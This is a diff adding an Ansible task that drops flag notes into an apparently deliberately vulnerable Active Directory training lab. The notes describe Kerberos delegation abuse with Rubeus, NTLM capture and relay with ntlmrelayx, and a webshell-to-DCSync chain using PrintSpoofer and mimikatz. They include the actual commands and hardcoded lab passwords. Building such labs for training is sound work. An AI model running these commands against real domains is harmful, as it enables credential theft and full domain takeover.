@@ -1,0 +1,58 @@
+---
+# ==============================================================================
+# vuln_web_apps/tasks/web_notes.yml — WEB-061..080
+# Target: dc01.corp.local (note drops for AD-integrated web surfaces)
+# ==============================================================================
+
+- name: WEB-061..080 - Drop AD-integrated web attack notes
+  ansible.windows.win_copy:
+    dest: "{{ item.path }}"
+    content: "{{ item.content }}"
+  loop:
+    - path: 'C:\Flags\FLAG-WEB-061-Kerberos-Delegation.txt'
+      content: |
+        WEB-061: Kerberos Constrained Delegation via Web App
+        ======================================================
+        IIS app pool (svc_iis) runs with Kerberos constrained delegation configured.
+        When a user authenticates to the web app via Kerberos, the app can impersonate
+        the user to backend services (e.g., SQL Server).
+
+        Attack (if svc_iis account is compromised):
+          S4U2Self + S4U2Proxy to impersonate Domain Admin to backend SQL
+
+        Tool: Rubeus s4u /user:svc_iis /aes256:<key> /impersonateuser:Administrator \
+          /msdsspn:MSSQLSvc/sql01.corp.local /ptt
+
+    - path: 'C:\Flags\FLAG-WEB-065-NTLM-WebApp.txt'
+      content: |
+        WEB-065: NTLM Authentication in Web App
+        =========================================
+        IIS is configured to use Windows Authentication (NTLM fallback) on some
+        virtual directories. When a user's browser sends an NTLM challenge/response,
+        it can be relayed or captured.
+
+        Capture: Responder + NTLM capture
+        Relay: ntlmrelayx.py --target smb://dc01.corp.local -tf targets.txt
+
+        Affected URLs: http://file01.corp.local/secure/
+        To test: curl --ntlm -u dvad\jim.halpert:Password123! http://file01.corp.local/secure/
+
+    - path: 'C:\Flags\FLAG-WEB-070-WebShell-Chain.txt'
+      content: |
+        WEB-070: Web Shell to AD Compromise Chain
+        ==========================================
+        Complete attack chain via IIS web app:
+
+        1. Exploit WEB-021 SQLi → extract DB credentials
+        2. Use WEB-012 file upload to plant ASPX webshell (no extension filtering)
+        3. Webshell runs as svc_iis (WinRM target — IA-087)
+        4. svc_iis has SeImpersonatePrivilege → PrintSpoofer → SYSTEM on file01
+        5. SYSTEM on file01 → dump local creds (DVADlab2024! reuse)
+        6. LAPS not deployed → same password on all machines
+        7. Lateral movement to DC → DCSync
+
+        Full chain:
+          curl -X POST http://file01.corp.local/upload.aspx --data cmd=whoami
+          → Execute PrintSpoofer.exe
+          → Get SYSTEM
+          → mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt
